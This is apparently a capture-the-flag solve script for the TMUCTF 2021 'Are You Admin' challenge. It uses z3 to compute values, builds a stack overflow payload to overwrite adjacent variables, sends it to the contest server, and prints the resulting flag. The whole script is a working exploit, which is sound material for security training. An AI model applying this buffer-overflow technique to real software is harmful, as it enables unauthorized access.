from pwn import *
from z3 import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './areyouadmin'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "194.5.207.113"
  PORT = 7020
  p = remote(HOST, PORT)
else:
  p = process(BINARY)

x = IntVector("x", 5)
s = Solver()

s.add(x[2]+x[0]*x[1] == 0x253f)
s.add(x[3]+x[1]*x[2] == 0x37a2)
s.add(x[4]+x[2]*x[3] == 0x16d3)
s.add(x[0]+x[3]*x[4] == 0x1bc9)
s.add(x[1]+x[4]*x[0] == 0x703f)
r = s.check()
if r == sat:
  y = [0]*5
  m = s.model()
  print(m)
  for i in range(5):
    y[i] = m[x[i]].as_long()


buf  = "AlexTheUser"
buf += "\x00"*(0x4c - len(buf))
buf += p32(y[4]) + p32(y[3]) + p32(y[2]) + p32(y[1]) + p32(y[0]) 
p.sendlineafter("Enter username:\n", buf)
p.sendlineafter("Enter password:\n", "4l3x7h3p455w0rd")

p.interactive()

'''
mito@ubuntu:~/CTF/TMUCTF_2021/Pwn_Are_You_Admin$ python solve.py r
[*] '/home/mito/CTF/TMUCTF_2021/Pwn_Are_You_Admin/areyouadmin'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 194.5.207.113 on port 7020: Done
[x__4 = 233, x__3 = 30, x__1 = 76, x__0 = 123, x__2 = 187]
[*] Switching to interactive mode
TMUCTF{7h3_6375_func710n_15_d4n63r0u5_4nd_5h0uld_n07_b3_u53d}
'''


